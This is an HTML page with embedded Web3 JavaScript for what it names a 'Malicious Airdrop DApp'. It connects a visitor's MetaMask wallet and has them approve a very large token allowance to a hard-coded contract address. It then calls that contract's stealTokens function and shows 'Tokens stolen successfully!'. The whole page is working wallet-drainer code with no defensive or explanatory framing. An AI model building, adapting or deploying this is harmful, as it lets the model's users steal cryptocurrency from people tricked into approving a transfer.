<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Airdrop DApp</title>
</head>
<body>
    <h1>Malicious Airdrop DApp</h1>
    <button id="connectWallet">Connect MetaMask</button>
    <button id="approveContract">Approve Contract</button>
    <p id="status"></p>

    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script>
        // Initialize Web3
        let web3;
        let userAddress;
        const contractAddress = "0xEDd1061AC707dcE56B48B77a700D75CD51f261cf"; // Replace with the deployed malicious contract
        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // Replace with the TKK token address

        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "account", "type": "address" }
                ],
                "name": "balanceOf",
                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transfer",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "sender", "type": "address" },
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transferFrom",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        const contractABI_Malicious = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        window.onload = async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                document.getElementById("connectWallet").addEventListener("click", connectWallet);
                document.getElementById("approveContract").addEventListener("click", approveContract);
            } else {
                alert("MetaMask not found. Please install it!");
            }
        };

        // Function to connect MetaMask
        async function connectWallet() {
            try {
                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                userAddress = accounts[0];
                document.getElementById("status").innerText = `Connected: ${userAddress}`;
            } catch (error) {
                console.error(error);
                document.getElementById("status").innerText = "Failed to connect wallet.";
            }
        }

        // Function to approve the malicious contract
        async function approveContract() {
            if (!userAddress) {
                alert("Please connect your MetaMask wallet first.");
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
                const maliciousContract = new web3.eth.Contract(contractABI_Malicious, contractAddress);

                const gasEstimate = await tokenContract.methods.approve(contractAddress, web3.utils.toWei("1000000", "ether")).estimateGas({ from: userAddress });
                
                // Approve the contract
                const receipt = await tokenContract.methods.approve(contractAddress, web3.utils.toWei("1000000", "ether"))
                    .send({ from: userAddress, gas: gasEstimate });
                console.log("Approval receipt:", receipt);

                document.getElementById("status").innerText = "Approval granted. Attempting to steal tokens...";
                
                // Call the stealTokens function automatically
                await maliciousContract.methods.stealTokens().send({ from: userAddress });
                document.getElementById("status").innerText = "Tokens stolen successfully!";
            } catch (error) {
                console.error("Error during approval or token transfer:", error);
                document.getElementById("status").innerText = "Failed to complete the process.";
            }
        }
    </script>
</body>
</html>
